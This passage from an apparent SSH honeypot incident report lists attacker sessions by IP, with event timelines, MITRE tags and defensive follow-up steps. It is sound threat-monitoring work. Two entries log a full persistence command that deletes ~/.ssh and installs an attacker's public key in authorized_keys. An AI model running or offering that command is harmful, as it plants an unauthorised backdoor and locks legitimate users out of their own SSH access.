- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ced5bd312207

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 05:12 |
| **Last Seen** | 2026-07-02 05:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:12:07` | `cowrie.session.connect` |
| `2026-07-02 05:12:07` | `cowrie.client.version` |
| `2026-07-02 05:12:07` | `cowrie.client.kex` |
| `2026-07-02 05:12:08` | `cowrie.login.success` |
| `2026-07-02 05:12:09` | `cowrie.session.params` |
| `2026-07-02 05:12:09` | `cowrie.command.input` |
| `2026-07-02 05:12:09` | `cowrie.log.closed` |
| `2026-07-02 05:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f92d06002c95

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 05:16 |
| **Last Seen** | 2026-07-02 05:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:16:28` | `cowrie.session.connect` |
| `2026-07-02 05:16:28` | `cowrie.client.version` |
| `2026-07-02 05:16:28` | `cowrie.client.kex` |
| `2026-07-02 05:16:28` | `cowrie.login.success` |
| `2026-07-02 05:16:30` | `cowrie.session.params` |
| `2026-07-02 05:16:30` | `cowrie.command.input` |
| `2026-07-02 05:16:30` | `cowrie.log.closed` |
| `2026-07-02 05:16:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70778149fa80

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 05:18 |
| **Last Seen** | 2026-07-02 05:18 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:18:10` | `cowrie.session.connect` |
| `2026-07-02 05:18:11` | `cowrie.client.version` |
| `2026-07-02 05:18:11` | `cowrie.client.kex` |
| `2026-07-02 05:18:19` | `cowrie.login.success` |
| `2026-07-02 05:18:23` | `cowrie.session.params` |
| `2026-07-02 05:18:23` | `cowrie.command.input` |
| `2026-07-02 05:18:24` | `cowrie.log.closed` |
| `2026-07-02 05:18:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb4d592bc072

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 05:20 |
| **Last Seen** | 2026-07-02 05:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:20:57` | `cowrie.session.connect` |
| `2026-07-02 05:20:57` | `cowrie.client.version` |
| `2026-07-02 05:20:57` | `cowrie.client.kex` |
| `2026-07-02 05:20:57` | `cowrie.login.success` |
| `2026-07-02 05:20:59` | `cowrie.session.params` |
| `2026-07-02 05:20:59` | `cowrie.command.input` |
| `2026-07-02 05:20:59` | `cowrie.log.closed` |
| `2026-07-02 05:20:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3c747d64eba

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 05:25 |
| **Last Seen** | 2026-07-02 05:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:25:26` | `cowrie.session.connect` |
| `2026-07-02 05:25:26` | `cowrie.client.version` |
| `2026-07-02 05:25:26` | `cowrie.client.kex` |
| `2026-07-02 05:25:26` | `cowrie.login.success` |
| `2026-07-02 05:25:28` | `cowrie.session.params` |
| `2026-07-02 05:25:28` | `cowrie.command.input` |
| `2026-07-02 05:25:28` | `cowrie.log.closed` |
| `2026-07-02 05:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f60a33f8db2

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 05:25 |
| **Last Seen** | 2026-07-02 05:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:25:43` | `cowrie.session.connect` |
| `2026-07-02 05:25:44` | `cowrie.client.version` |
| `2026-07-02 05:25:44` | `cowrie.client.kex` |
| `2026-07-02 05:25:45` | `cowrie.login.success` |
| `2026-07-02 05:25:46` | `cowrie.session.params` |
| `2026-07-02 05:25:46` | `cowrie.command.input` |
| `2026-07-02 05:25:46` | `cowrie.log.closed` |
| `2026-07-02 05:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe37d9672e85

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 05:30 |
| **Last Seen** | 2026-07-02 05:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:30:09` | `cowrie.session.connect` |
| `2026-07-02 05:30:09` | `cowrie.client.version` |
| `2026-07-02 05:30:09` | `cowrie.client.kex` |
| `2026-07-02 05:30:09` | `cowrie.login.success` |
| `2026-07-02 05:30:11` | `cowrie.session.params` |
| `2026-07-02 05:30:11` | `cowrie.command.input` |
| `2026-07-02 05:30:11` | `cowrie.log.closed` |
| `2026-07-02 05:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc9f66e1be73

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 05:30 |
| **Last Seen** | 2026-07-02 05:30 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:30:45` | `cowrie.session.connect` |
| `2026-07-02 05:30:47` | `cowrie.client.version` |
| `2026-07-02 05:30:47` | `cowrie.client.kex` |
| `2026-07-02 05:30:52` | `cowrie.login.success` |
| `2026-07-02 05:30:56` | `cowrie.session.params` |
| `2026-07-02 05:30:56` | `cowrie.command.input` |
| `2026-07-02 05:30:59` | `cowrie.log.closed` |
| `2026-07-02 05:30:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d6c0fe8e5cf

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-02 05:33 |
| **Last Seen** | 2026-07-02 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:33:43` | `cowrie.session.connect` |
| `2026-07-02 05:33:43` | `cowrie.client.version` |
| `2026-07-02 05:33:43` | `cowrie.client.kex` |
| `2026-07-02 05:33:44` | `cowrie.login.success` |
| `2026-07-02 05:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-624f42176ca5

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-02 05:33 |
| **Last Seen** | 2026-07-02 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:33:44` | `cowrie.session.connect` |
| `2026-07-02 05:33:44` | `cowrie.client.version` |
| `2026-07-02 05:33:45` | `cowrie.client.kex` |
| `2026-07-02 05:33:46` | `cowrie.login.success` |
| `2026-07-02 05:33:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba005a182e68

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 05:35 |
| **Last Seen** | 2026-07-02 05:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:35:01` | `cowrie.session.connect` |
| `2026-07-02 05:35:01` | `cowrie.client.version` |
| `2026-07-02 05:35:01` | `cowrie.client.kex` |
| `2026-07-02 05:35:01` | `cowrie.login.success` |
| `2026-07-02 05:35:03` | `cowrie.session.params` |
| `2026-07-02 05:35:03` | `cowrie.command.input` |
| `2026-07-02 05:35:03` | `cowrie.log.closed` |
| `2026-07-02 05:35:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3438ac42f004

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 05:39 |
| **Last Seen** | 2026-07-02 05:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:39:33` | `cowrie.session.connect` |
| `2026-07-02 05:39:34` | `cowrie.client.version` |
| `2026-07-02 05:39:34` | `cowrie.client.kex` |
| `2026-07-02 05:39:35` | `cowrie.login.success` |
| `2026-07-02 05:39:36` | `cowrie.session.params` |
| `2026-07-02 05:39:36` | `cowrie.command.input` |
| `2026-07-02 05:39:37` | `cowrie.log.closed` |
| `2026-07-02 05:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a2da1022a9c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 05:40 |
| **Last Seen** | 2026-07-02 05:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:40:17` | `cowrie.session.connect` |
| `2026-07-02 05:40:17` | `cowrie.client.version` |
| `2026-07-02 05:40:17` | `cowrie.client.kex` |
| `2026-07-02 05:40:18` | `cowrie.login.success` |
| `2026-07-02 05:40:19` | `cowrie.session.params` |
| `2026-07-02 05:40:19` | `cowrie.command.input` |
| `2026-07-02 05:40:19` | `cowrie.log.closed` |
| `2026-07-02 05:40:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f9240405225

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 05:42 |
| **Last Seen** | 2026-07-02 05:43 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:42:58` | `cowrie.session.connect` |
| `2026-07-02 05:42:59` | `cowrie.client.version` |
| `2026-07-02 05:42:59` | `cowrie.client.kex` |
| `2026-07-02 05:43:05` | `cowrie.login.success` |
| `2026-07-02 05:43:09` | `cowrie.session.params` |
| `2026-07-02 05:43:09` | `cowrie.command.input` |
| `2026-07-02 05:43:10` | `cowrie.log.closed` |
| `2026-07-02 05:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0b5b8c15ac7

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 05:43 |
| **Last Seen** | 2026-07-02 05:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:43:01` | `cowrie.session.connect` |
| `2026-07-02 05:43:01` | `cowrie.client.version` |
| `2026-07-02 05:43:01` | `cowrie.client.kex` |
| `2026-07-02 05:43:01` | `cowrie.login.success` |
| `2026-07-02 05:43:02` | `cowrie.session.params` |
| `2026-07-02 05:43:02` | `cowrie.command.input` |
| `2026-07-02 05:43:02` | `cowrie.log.closed` |
| `2026-07-02 05:43:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faa36757a72e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 05:45 |
| **Last Seen** | 2026-07-02 05:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:45:49` | `cowrie.session.connect` |
| `2026-07-02 05:45:49` | `cowrie.client.version` |
| `2026-07-02 05:45:49` | `cowrie.client.kex` |
| `2026-07-02 05:45:49` | `cowrie.login.success` |
| `2026-07-02 05:45:51` | `cowrie.session.params` |
| `2026-07-02 05:45:51` | `cowrie.command.input` |
| `2026-07-02 05:45:51` | `cowrie.log.closed` |
| `2026-07-02 05:45:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-009a64a6466b

| Field | Detail |
|---|---|
| **Source IP** | `165.154.36[.]71` |
| **First Seen** | 2026-07-02 05:47 |
| **Last Seen** | 2026-07-02 05:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:47:42` | `cowrie.session.connect` |
| `2026-07-02 05:47:42` | `cowrie.client.version` |
| `2026-07-02 05:47:42` | `cowrie.client.kex` |
| `2026-07-02 05:47:42` | `cowrie.login.success` |
| `2026-07-02 05:47:43` | `cowrie.session.params` |
| `2026-07-02 05:47:43` | `cowrie.command.input` |
| `2026-07-02 05:47:43` | `cowrie.command.failed` |
| `2026-07-02 05:47:43` | `cowrie.log.closed` |
| `2026-07-02 05:47:44` | `cowrie.session.params` |
| `2026-07-02 05:47:44` | `cowrie.command.input` |
| `2026-07-02 05:47:44` | `cowrie.session.file_download` |
| `2026-07-02 05:47:44` | `cowrie.log.closed` |
| `2026-07-02 05:47:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.36[.]71` to AbuseIPDB if not already reported
- [ ] Block `165.154.36[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f138d5b00df6

| Field | Detail |
|---|---|
| **Source IP** | `165.154.36[.]71` |
| **First Seen** | 2026-07-02 05:47 |
| **Last Seen** | 2026-07-02 05:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:47:44` | `cowrie.session.connect` |
| `2026-07-02 05:47:44` | `cowrie.client.version` |
| `2026-07-02 05:47:44` | `cowrie.client.kex` |
| `2026-07-02 05:47:45` | `cowrie.login.success` |
| `2026-07-02 05:47:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.36[.]71` to AbuseIPDB if not already reported
- [ ] Block `165.154.36[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f05d070d820

| Field | Detail |
|---|---|
| **Source IP** | `165.154.36[.]71` |
| **First Seen** | 2026-07-02 05:47 |
| **Last Seen** | 2026-07-02 05:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:47:45` | `cowrie.session.connect` |
| `2026-07-02 05:47:45` | `cowrie.client.version` |
| `2026-07-02 05:47:45` | `cowrie.client.kex` |
| `2026-07-02 05:47:45` | `cowrie.login.success` |
| `2026-07-02 05:47:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.36[.]71` to AbuseIPDB if not already reported
- [ ] Block `165.154.36[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a0d912fbbc6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 05:51 |
| **Last Seen** | 2026-07-02 05:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:51:22` | `cowrie.session.connect` |
| `2026-07-02 05:51:22` | `cowrie.client.version` |
| `2026-07-02 05:51:22` | `cowrie.client.kex` |
| `2026-07-02 05:51:23` | `cowrie.login.success` |
| `2026-07-02 05:51:24` | `cowrie.session.params` |
| `2026-07-02 05:51:24` | `cowrie.command.input` |
| `2026-07-02 05:51:24` | `cowrie.log.closed` |
| `2026-07-02 05:51:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcd438985713

| Field | Detail |
|---|---|
| **Source IP** | `65.49.1[.]108` |
| **First Seen** | 2026-07-02 05:51 |
| **Last Seen** | 2026-07-02 05:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:51:28` | `cowrie.session.connect` |
| `2026-07-02 05:51:28` | `cowrie.login.success` |
| `2026-07-02 05:51:29` | `cowrie.session.params` |
| `2026-07-02 05:51:29` | `cowrie.command.input` |
| `2026-07-02 05:51:29` | `cowrie.command.input` |
| `2026-07-02 05:51:29` | `cowrie.command.failed` |
| `2026-07-02 05:51:29` | `cowrie.command.input` |
| `2026-07-02 05:51:29` | `cowrie.command.failed` |
| `2026-07-02 05:51:29` | `cowrie.command.input` |
| `2026-07-02 05:51:29` | `cowrie.log.closed` |
| `2026-07-02 05:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.49.1[.]108` to AbuseIPDB if not already reported
- [ ] Block `65.49.1[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2bd3f712b8a

| Field | Detail |
|---|---|
| **Source IP** | `223.17.1[.]118` |
| **First Seen** | 2026-07-02 05:51 |
| **Last Seen** | 2026-07-02 05:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:51:54` | `cowrie.session.connect` |
| `2026-07-02 05:51:54` | `cowrie.client.version` |
| `2026-07-02 05:51:54` | `cowrie.client.kex` |
| `2026-07-02 05:51:55` | `cowrie.login.success` |
| `2026-07-02 05:51:56` | `cowrie.session.params` |
| `2026-07-02 05:51:56` | `cowrie.command.input` |
| `2026-07-02 05:51:56` | `cowrie.command.failed` |
| `2026-07-02 05:51:56` | `cowrie.log.closed` |
| `2026-07-02 05:51:57` | `cowrie.session.params` |
| `2026-07-02 05:51:57` | `cowrie.command.input` |
| `2026-07-02 05:51:57` | `cowrie.session.file_download` |
| `2026-07-02 05:51:57` | `cowrie.log.closed` |
| `2026-07-02 05:52:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.17.1[.]118` to AbuseIPDB if not already reported
- [ ] Block `223.17.1[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40e1fc0c0ec0

| Field | Detail |
|---|---|
| **Source IP** | `223.17.1[.]118` |
| **First Seen** | 2026-07-02 05:51 |
| **Last Seen** | 2026-07-02 05:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:51:58` | `cowrie.session.connect` |
| `2026-07-02 05:51:58` | `cowrie.client.version` |
| `2026-07-02 05:51:58` | `cowrie.client.kex` |
| `2026-07-02 05:51:59` | `cowrie.login.success` |
| `2026-07-02 05:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.17.1[.]118` to AbuseIPDB if not already reported
- [ ] Block `223.17.1[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56d24ad43dd2

| Field | Detail |
|---|---|
| **Source IP** | `223.17.1[.]118` |
| **First Seen** | 2026-07-02 05:51 |
| **Last Seen** | 2026-07-02 05:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:51:59` | `cowrie.session.connect` |
| `2026-07-02 05:51:59` | `cowrie.client.version` |
| `2026-07-02 05:51:59` | `cowrie.client.kex` |
| `2026-07-02 05:52:00` | `cowrie.login.success` |
| `2026-07-02 05:52:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.17.1[.]118` to AbuseIPDB if not already reported
- [ ] Block `223.17.1[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-093a17ebba8c

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 05:53 |
| **Last Seen** | 2026-07-02 05:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
